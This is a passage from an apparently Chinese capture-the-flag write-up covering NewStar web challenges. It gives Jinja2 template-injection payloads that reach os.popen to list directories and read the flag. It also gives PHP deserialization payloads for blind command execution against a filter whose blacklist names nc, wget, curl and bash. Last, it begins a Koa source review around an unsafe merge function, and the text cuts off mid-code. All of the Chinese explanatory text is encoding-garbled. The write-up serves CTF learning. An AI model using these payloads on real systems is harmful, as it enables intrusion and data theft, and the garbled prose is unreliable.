&#x27;blinker._saferef.BoundMethodWeakref&#x27;&gt;, &lt;class &#x27;blinker._utilities._symbol&#x27;&gt;, &lt;class &#x27;blinker._utilities.symbol&#x27;&gt;, &lt;class &#x27;blinker._utilities.lazy_property&#x27;&gt;, &lt;class &#x27;blinker.base.Signal&#x27;&gt;, &lt;class &#x27;flask.cli.ScriptInfo&#x27;&gt;, &lt;class &#x27;flask.config.ConfigAttribute&#x27;&gt;, &lt;class &#x27;flask.ctx._AppCtxGlobals&#x27;&gt;, &lt;class &#x27;flask.ctx.AppContext&#x27;&gt;, &lt;class &#x27;flask.ctx.RequestContext&#x27;&gt;, &lt;class &#x27;_pickle.Unpickler&#x27;&gt;, &lt;class &#x27;_pickle.Pickler&#x27;&gt;, &lt;class &#x27;_pickle.Pdata&#x27;&gt;, &lt;class &#x27;_pickle.PicklerMemoProxy&#x27;&gt;, &lt;class &#x27;_pickle.UnpicklerMemoProxy&#x27;&gt;, &lt;class &#x27;pickle._Framer&#x27;&gt;, &lt;class &#x27;pickle._Unframer&#x27;&gt;, &lt;class &#x27;pickle._Pickler&#x27;&gt;, &lt;class &#x27;pickle._Unpickler&#x27;&gt;, &lt;class &#x27;jinja2.bccache.Bucket&#x27;&gt;, &lt;class &#x27;jinja2.bccache.BytecodeCache&#x27;&gt;, &lt;class &#x27;jinja2.utils.MissingType&#x27;&gt;, &lt;class &#x27;jinja2.utils.LRUCache&#x27;&gt;, &lt;class &#x27;jinja2.utils.Cycler&#x27;&gt;, &lt;class &#x27;jinja2.utils.Joiner&#x27;&gt;, &lt;class &#x27;jinja2.utils.Namespace&#x27;&gt;, &lt;class &#x27;jinja2.nodes.EvalContext&#x27;&gt;, &lt;class &#x27;jinja2.nodes.Node&#x27;&gt;, &lt;class &#x27;jinja2.visitor.NodeVisitor&#x27;&gt;, &lt;class &#x27;jinja2.idtracking.Symbols&#x27;&gt;, &lt;class &#x27;jinja2.compiler.MacroRef&#x27;&gt;, &lt;class &#x27;jinja2.compiler.Frame&#x27;&gt;, &lt;class &#x27;jinja2.runtime.TemplateReference&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Context&#x27;&gt;, &lt;class &#x27;jinja2.runtime.BlockReference&#x27;&gt;, &lt;class &#x27;jinja2.runtime.LoopContext&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Macro&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Undefined&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Failure&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStreamIterator&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStream&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Lexer&#x27;&gt;, &lt;class &#x27;jinja2.parser.Parser&#x27;&gt;, &lt;class &#x27;jinja2.environment.Environment&#x27;&gt;, &lt;class &#x27;jinja2.environment.Template&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateModule&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateExpression&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateStream&#x27;&gt;, &lt;class &#x27;jinja2.loaders.BaseLoader&#x27;&gt;, &lt;class &#x27;flask.scaffold.Scaffold&#x27;&gt;, &lt;class &#x27;itsdangerous.signer.SigningAlgorithm&#x27;&gt;, &lt;class &#x27;itsdangerous.signer.Signer&#x27;&gt;, &lt;class &#x27;itsdangerous.serializer.Serializer&#x27;&gt;, &lt;class &#x27;itsdangerous._json._CompactJSON&#x27;&gt;, &lt;class &#x27;flask.json.tag.JSONTag&#x27;&gt;, &lt;class &#x27;flask.json.tag.TaggedJSONSerializer&#x27;&gt;, &lt;class &#x27;flask.sessions.SessionInterface&#x27;&gt;, &lt;class &#x27;flask.blueprints.BlueprintSetupState&#x27;&gt;, &lt;class &#x27;codeop.Compile&#x27;&gt;, &lt;class &#x27;codeop.CommandCompiler&#x27;&gt;, &lt;class &#x27;code.InteractiveInterpreter&#x27;&gt;, &lt;class &#x27;werkzeug.debug.repr._Helper&#x27;&gt;, &lt;class &#x27;werkzeug.debug.repr.DebugReprGenerator&#x27;&gt;, &lt;class &#x27;werkzeug.debug.console.HTMLStringO&#x27;&gt;, &lt;class &#x27;werkzeug.debug.console.ThreadedStream&#x27;&gt;, &lt;class &#x27;werkzeug.debug.console._ConsoleLoader&#x27;&gt;, &lt;class &#x27;werkzeug.debug.console.Console&#x27;&gt;, &lt;class &#x27;werkzeug.debug.tbtools.DebugTraceback&#x27;&gt;, &lt;class &#x27;werkzeug.debug._ConsoleFrame&#x27;&gt;, &lt;class &#x27;werkzeug.debug.DebuggedApplication&#x27;&gt;, &lt;class &#x27;werkzeug._reloader.ReloaderLoop&#x27;&gt;] &quot;</span><br><span class="hljs-built_in">list</span> = <span class="hljs-built_in">str</span>.split(<span class="hljs-string">&quot;,&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br>count = <span class="hljs-number">0</span><br>tem = <span class="hljs-string">&#x27;os._wrap_close&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>[i])<br>    <span class="hljs-keyword">if</span> tem <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>[i]:<br>        <span class="hljs-built_in">print</span>(count)<br>        <span class="hljs-keyword">break</span><br>    count = count+<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=&#123;%print(().__class__.__base__.__subclasses__()[132])%&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010163213824.png" alt="image-20231010163213824"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">ä½¿ç”¨&quot;~&quot;è¿›è¡Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼š<br>secr3tofpop?name=&#123;%print(().__class__.__base__.__subclasses__()[132][&quot;__in&quot;~&quot;it__&quot;])%&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010161929907.png" alt="image-20231010161929907"></p><p>paylaod:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=&#123;%print(().__class__.__base__.__subclasses__()[132][&quot;__in&quot;~&quot;it__&quot;].__globals__[&quot;pop&quot;~&quot;en&quot;])%&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010162204147.png" alt="image-20231010162204147"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=&#123;%print(().__class__.__base__.__subclasses__()[132][&quot;__in&quot;~&quot;it__&quot;].__globals__[&quot;pop&quot;~&quot;en&quot;](&quot;ls /&quot;).read())%&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010162348128.png" alt="image-20231010162348128"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">secr3tofpop?name=&#123;%print(().__class__.__base__.__subclasses__()[132][&quot;__in&quot;~&quot;it__&quot;].__globals__[&quot;pop&quot;~&quot;en&quot;](&quot;tac /flag&quot;).read())%&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010162449022.png" alt="image-20231010162449022"></p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h2><p>ä»£ç å®¡è®¡:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>    <span class="hljs-comment">//æœ‰ç±»çš„è¾“å‡ºä¼šè¿›è¡Œæ‰§è¡Œ</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//è¿‡æ»¤äº†:$ . ! @ # % ^ &amp; * ? &#123; &#125; &gt; &lt;</span><br>        <span class="hljs-comment">//nc tee wget exec bash sh netcat grep base64 rev curl </span><br>        <span class="hljs-comment">//wget gcc php python pingtouch mv mkdir cp</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;code))&#123;<br>            <span class="hljs-comment">//æ— å›æ˜¾rce</span><br>            <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;code);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;alright&quot;</span>;<br>    &#125;<br>    <span class="hljs-comment">//ååºåˆ—åŒ–è‡ªåŠ¨è§¦å‘</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//å¯ç”¨äºæ‰§è¡Œ__toString()å‡½æ•°</span><br>        <span class="hljs-comment">//$this-&gt;qwejaskdjnlka = new minipop();</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;qwejaskdjnlka;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]))&#123;<br>    <span class="hljs-comment">//wanna try?</span><br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]);<br>&#125; <br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_62046696/article/details/125859628?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-2-125859628-blog-123039067.235%5Ev38%5Epc_relevant_anti_vip_base&spm=1001.2101.3001.4242.2&utm_relevant_index=5">rceï¼ˆæ— å›æ˜¾ï¼‰_æ— å›æ˜¾rce_å¶å°”èº²èº²ä¹Œäº‘334çš„åšå®¢-CSDNåšå®¢</a></p><p>æµ‹è¯•å‘½ä»¤æ˜¯å¦è¢«æ‰§è¡Œ:</p><p>æ„é€ rceè„šæœ¬:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;code = <span class="hljs-string">&quot;ls / | sed &#x27;1,20w test1&#x27;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-comment">// $payload=&quot;tac /flag_is_h3eeere | sed &#x27;1,20w test&#x27;&quot;;</span><br><span class="hljs-comment">// $obj-&gt;code = $payload;</span><br><span class="hljs-variable">$obj</span>-&gt;qwejaskdjnlka = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$obj2</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj2</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">$this-&gt;code=&#x27;ls|sleep 5&#x27;;//ä¼šä½¿ç½‘é¡µå»¶è¿Ÿ5ç§’<br><br>POST:<br>payload=O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:10:&quot;ls|sleep 5&quot;;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:10:&quot;ls|sleep 5&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;<br></code></pre></td></tr></table></figure><p>å‘ç°ç½‘é¡µå»¶è¿Ÿå›æ˜¾ï¼Œè¯´æ˜æˆ‘ä»¬ä¸Šä¼ çš„payloadå‘½ä»¤å¯ä»¥è¢«æ‰§è¡Œ</p><p><strong>sedç®¡é“å‘½ä»¤æ‰§è¡Œ:</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">tac /flag_is_h3eeere | sed &#x27;1,20w test&#x27;<br>å°†|ä¹‹å‰å‘½ä»¤æ‰§è¡Œçš„ç»“æœçš„1-20è¡Œå†…å®¹å†™å…¥testæ–‡ä»¶ä¸­ï¼Œtest&lt;=&gt;./test,æ‰€ä»¥testæ–‡ä»¶å­˜åœ¨äºå½“å‰ç½‘é¡µçš„æ–‡ä»¶å¤¹ä¸­<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">$this-&gt;code = &quot;ls / | sed &#x27;1,20w test1&#x27;&quot;;<br>POST:<br>payload=O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:24:&quot;ls / | sed &#x27;1,20w test1&#x27;&quot;;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:24:&quot;ls / | sed &#x27;1,20w test1&#x27;&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231031192813120.png" alt="image-20231031192813120"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">$payload=&quot;tac /flag_is_h3eeere | sed &#x27;1,20w test&#x27;&quot;;<br><br>POST:<br>payload=O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:39:&quot;tac /flag_is_h3eeere | sed &#x27;1,20w test&#x27;&quot;;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:39:&quot;tac /flag_is_h3eeere | sed &#x27;1,20w test&#x27;&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231013111032145.png" alt="image-20231013111032145"></p><h2 id="OtenkiGirl"><a href="#OtenkiGirl" class="headerlink" title="OtenkiGirl"></a>OtenkiGirl</h2><p>è¯¥é¢˜æä¾›äº†ç½‘é¡µçš„æºç ï¼Œæˆ‘ä»¬å¯ä»¥ä»ç½‘é¡µçš„æºç ä¸­è¿›è¡Œåˆ†æ:<br><img src="/images/2023-11-3-newstar-3/image-20231028152657729.png" alt="image-20231028152657729"></p><p>æºç ä¸­å­˜åœ¨è·¯ç”±æ–‡ä»¶å¤¹ï¼Œå…ˆæŸ¥çœ‹ç½‘é¡µçš„å…·ä½“è¿è¡Œé€»è¾‘æ˜¯ä»€ä¹ˆï¼Œå³ä»ç½‘é¡µçš„è·¯ç”±å¼€å§‹åˆ†æ:</p><p>submit.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Router</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;koa-router&quot;</span>);<br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SQL</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./sql&quot;</span>);<br><span class="hljs-keyword">const</span> sql = <span class="hljs-keyword">new</span> <span class="hljs-title function_">SQL</span>(<span class="hljs-string">&quot;wishes&quot;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">Base58</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;base-58&quot;</span>);<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">ALPHABET</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">rndText</span> = (<span class="hljs-params">length</span>) =&gt; &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(&#123; length &#125;, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable constant_">ALPHABET</span>[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-variable constant_">ALPHABET</span>.<span class="hljs-property">length</span>)]).<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">timeText</span> = (<span class="hljs-params">timestamp</span>) =&gt; &#123;<br>    timestamp = (<span class="hljs-keyword">typeof</span> timestamp === <span class="hljs-string">&quot;number&quot;</span> ? timestamp : <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()).<span class="hljs-title function_">toString</span>();<br>    <span class="hljs-keyword">let</span> text1 = timestamp.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, timestamp.<span class="hljs-property">length</span> / <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">let</span> text2 = timestamp.<span class="hljs-title function_">substring</span>(timestamp.<span class="hljs-property">length</span> / <span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">let</span> text = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; text1.<span class="hljs-property">length</span>; i++)<br>        text += text1[i] + text2[text2.<span class="hljs-property">length</span> - <span class="hljs-number">1</span> - i];<br>    <span class="hljs-keyword">if</span> (text2.<span class="hljs-property">length</span> &gt; text1.<span class="hljs-property">length</span>) text += text2[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Base58</span>.<span class="hljs-title function_">encode</span>(<span class="hljs-title function_">rndText</span>(<span class="hljs-number">3</span>) + <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(text)); <span class="hljs-comment">// length = 20</span><br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">rndID</span> = (<span class="hljs-params">length, timestamp</span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> t = <span class="hljs-title function_">timeText</span>(timestamp);<br>    <span class="hljs-keyword">if</span> (length &lt; t.<span class="hljs-property">length</span>) <span class="hljs-keyword">return</span> t.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, length);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> t + <span class="hljs-title function_">rndText</span>(length - t.<span class="hljs-property">length</span>);<br>&#125;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">insert2db</span>(<span class="hljs-params">data</span>) &#123;<br>    <span class="hljs-keyword">let</span> date = <span class="hljs-title class_">String</span>(data[<span class="hljs-string">&quot;date&quot;</span>]),<br>        place = <span class="hljs-title class_">String</span>(data[<span class="hljs-string">&quot;place&quot;</span>]),<br>        contact = <span class="hljs-title class_">String</span>(data[<span class="hljs-string">&quot;contact&quot;</span>]),<br>        reason = <span class="hljs-title class_">String</span>(data[<span class="hljs-string">&quot;reason&quot;</span>]);<br>    <span class="hljs-keyword">const</span> timestamp = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br>    <span class="hljs-keyword">const</span> wishid = <span class="hljs-title function_">rndID</span>(<span class="hljs-number">24</span>, timestamp);<br>    <span class="hljs-comment">//å°†ç”¨æˆ·è¾“å…¥çš„å†…å®¹æ’å…¥æ•°æ®åº“ä¸­</span><br>    <span class="hljs-keyword">await</span> sql.<span class="hljs-title function_">run</span>(<span class="hljs-string">`INSERT INTO wishes (wishid, date, place, contact, reason, timestamp) VALUES (?, ?, ?, ?, ?, ?)`</span>, [wishid, date, place, contact, reason, timestamp]).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123; <span class="hljs-keyword">throw</span> e &#125;);<br>    <span class="hljs-keyword">return</span> &#123; wishid, date, place, contact, reason, timestamp &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">merge</span> = (<span class="hljs-params">dst, src</span>) =&gt; &#123;<br>    <span class="hljs-comment">//åœ¨jsä¸­å¦‚æœå¯¹è±¡æ—¶jsonç±»å‹å³const data=&#123;&#125;,åˆ™è¯¥dataå¯¹è±¡çš„ç±»å‹å°±ä¸ºobjectï¼Œå¦åˆ™å°±ä¸æ˜¯ï¼Œè¿”å›dstæ‰€ä»£è¡¨çš„å€¼</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> dst !== <span class="hljs-string">&quot;object&quot;</span> || <span class="hljs-keyword">typeof</span> src !== <span class="hljs-string">&quot;object&quot;</span>) <span class="hljs-keyword">return</span> dst;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> src) &#123; <span class="hljs-comment">//è·å–srcä¸­çš„é”®</span><br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> dst &amp;&amp; key <span class="hljs-keyword">in</span> src) &#123; <span class="hljs-comment">//å¦‚æœé”®å­˜åœ¨äºä¸¤ä¸ªå¯¹è±¡ä¸­åˆ™è¿›è¡Œåˆå¹¶</span><br>            <span class="hljs-comment">//å°†ä¸¤ä¸ªå¯¹è±¡æ‰€å¯¹åº”çš„keyçš„valueè¿›è¡Œåˆå¹¶ï¼Œè¿”å›ç»™dstå¯¹è±¡</span><br>            dst[key] = <span class="hljs-title function_">merge</span>(dst[key], src[key]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//å¦‚æœdstå¯¹è±¡ä¸­ä¸å­˜åœ¨è¯¥é”®å€¼ï¼Œåˆ™æ·»åŠ ä¸Šè¯¥é”®å€¼</span><br>            dst[key] = src[key];<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//æ‰€ä»¥æœ€ç»ˆè¯¥ä»£ç æ·»åŠ ä¸Šdstä¸­æ²¡æœ‰srcä¸­æœ‰çš„é”®å€¼å†…å®¹ç»™dst,ä¿æŒä¸¤è€…éƒ½æœ‰çš„å†…å®¹åœ¨dstä¸­ä¸å˜</span><br>    <span class="hljs-keyword">return</span> dst;<br>&#125;<br><br><span class="hljs-comment">//ç½‘é¡µä»¥postè¯·æ±‚çš„æ–¹å¼è®¿é—®/submitåœ°å€æ—¶,atxå­˜å‚¨äº†è¯·æ±‚å’Œå“åº”çš„ä¿¡æ¯</span><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/submit&quot;</span>, <span class="hljs-title function_">async</span>(ctx) =&gt; &#123;<br>    <span class="hljs-comment">//åˆ¤æ–­ï¼Œä¼ è¾“ç±»å‹æ˜¯å¦æ˜¯application/json</span><br>    <span class="hljs-keyword">if</span> (ctx.<span class="hljs-property">header</span>[<span class="hljs-string">&quot;content-type&quot;</span>] !== <span class="hljs-string">&quot;application/json&quot;</span>)<br>    <span class="hljs-comment">//è¿”å›ä¸€ä¸ªä»¥jsonæ•°æ®ä¸ºæ ¼å¼çš„å“åº”å†…å®¹</span><br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Content-Type must be application/json&quot;</span><br>        &#125;<br>        <span class="hljs-comment">//è·å–è¯·æ±‚ä½“ä¸­çš„jsonä¸»ä½“å†…å®¹</span><br>    <span class="hljs-keyword">const</span> jsonText = ctx.<span class="hljs-property">request</span>.<span class="hljs-property">rawBody</span> || <span class="hljs-string">&quot;&#123;&#125;&quot;</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span 